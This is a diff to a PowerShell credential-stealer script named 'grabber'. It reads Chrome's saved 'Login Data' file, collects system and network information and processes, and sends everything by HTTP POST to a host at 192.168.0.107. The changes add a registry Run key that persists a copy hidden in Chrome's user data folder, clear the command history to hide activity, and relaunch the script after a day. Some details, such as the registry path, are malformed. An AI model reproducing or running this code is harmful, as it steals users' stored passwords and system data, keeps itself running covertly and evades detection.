@@ -4,12 +4,15 @@ cd Default
 
 $var += cat "Login Data"
 
-$var += ipconfig 
+$var += Get-NetIPConfiguration 
 
-$var += whoami 
+$var += whoami
+
+$var += Get-ComputerInfo
+
+$var += Get-Date
 
 $var += ps 
-
 Start-Sleep -Seconds 3
 
 #start http post 
@@ -17,11 +20,17 @@ Start-Sleep -Seconds 3
 #httpsend
 
     $Response = Invoke-WebRequest -Method Post -URI http://192.168.0.107:80 -body $var -UseBasicParsing
-#set regedit
 
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-    -Name "grabber" `
-    -Value "Desktop\#simple download.bat" 
+#set per
 
-Start-Sleep -Seconds 1.5
-exit
+New-ItemProperty -Path "Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
+    -Name "grabber4.ps1" `
+    -Value "%LOCALAPPDATA%\Google\Chrome\User Data\grabber4.ps1 -autostart"
+
+cd..
+
+Clear-History
+
+start-sleep 86400
+
+./grabber4.ps1
